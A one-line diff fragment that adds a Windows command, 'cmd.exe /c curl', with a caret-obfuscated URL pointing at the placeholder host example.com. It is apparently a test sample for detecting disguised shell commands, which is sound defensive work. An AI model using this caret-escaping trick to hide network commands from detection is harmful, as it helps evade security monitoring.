@@ -1,0 +1,1 @@
+cmd.exe /c curl h^t^t^p^:^/^/example.com
